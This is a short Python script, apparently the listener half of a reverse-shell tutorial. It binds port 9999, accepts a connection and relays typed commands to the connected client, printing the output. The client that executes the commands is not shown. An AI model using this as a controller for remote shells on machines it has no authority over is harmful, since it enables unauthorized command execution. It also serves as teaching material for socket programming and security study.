import socket
import sys

# Create socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()  # the socket() function returns a socket object whose methods implement the various socket system calls.

    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


# Binding socket and listen for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print('Binding the port ' + str(port))

        s.bind((host, port))  # binding the socket locally
        s.listen(5)  # we are using 5 incoming connection before denying any more

    except socket.error as msg:
        print('Socket binding error' + str(msg) + '\n' + 'Retrying ...')
        bind_socket()

    # Establish connection with client


def socket_accept():
    conn, address = s.accept()  # only works if there is connection or incoming connection
    print('Connection has been established |' + ' IP ' + address[0] + ' | Port ' + str(address[1]))
    send_commands(conn)
    conn.close()


# Send command to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()  # closing the socket
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
